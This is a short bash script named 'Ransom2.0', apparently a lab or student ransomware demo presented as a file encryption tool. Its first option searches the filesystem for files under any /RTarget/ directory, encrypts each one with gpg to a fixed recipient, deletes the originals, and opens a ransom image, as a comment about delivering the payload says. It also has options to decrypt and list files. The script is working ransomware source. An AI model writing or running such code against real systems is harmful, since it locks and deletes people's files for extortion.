#! /bin/bash

figlet "Ransom2.0"
echo
echo "This program is designed to encrypt and decrypt files for users"
echo
echo "Input 1,2 or 3 to choose from one of the following options"
echo "1) Encrypt Data"
echo "2) Decrypt Data"
echo "3) List Encrypted Files"
echo "4) Exit Application"
echo
echo -n "enter your selection again :"
read UserInput


if (( $UserInput == 1 ))
#ENCRYPTION
then
        #generate array based on list of files found
        fileList=($(find / -type f -print 2>/dev/null|grep /RTarget/ ))
        length=${#fileList[@]}
        #go through array and encrypt files with public key
        for ((i = 0; i != length; i++)); do
                gpg -v --always-trust -e -r jamie ${fileList[i]}
                rm ${fileList[i]}
        done
        #user has been hacked deliver payload
	xdg-open ransomware-attack.jpg
elif (($UserInput == 2 )) 
then
        #DECRYPTION
        #generate array based on list of encrypted files found
        fileList=($(find / -type f -print 2>/dev/null|grep /RTarget/ | grep .gpg | sed "s/\.gpg//"))

        length=${#fileList[@]}
        #Decrypt files in the array
        for ((i = 0; i != length; i++)); do
                gpg --decrypt ${fileList[i]}.gpg > ${fileList[i]}
                rm ${fileList[i]}.gpg
        done
elif (($UserInput == 3)) 
then
        #finds and outputs list of encrypted files
	echo "All encrypted files that exist on the system are listed below"
	echo "-------------------------------------------------------------"
	find / -type f -print 2>/dev/null|grep /RTarget/ | grep .gpg | sed "s/\.gpg//"
elif (( $UserInput == 4)) ;
then
        #exit application
        echo "Exiting Application"
        exit 0
else
        #exit application
        echo "This is not a valid option: Exiting Application"
        exit 0

fi



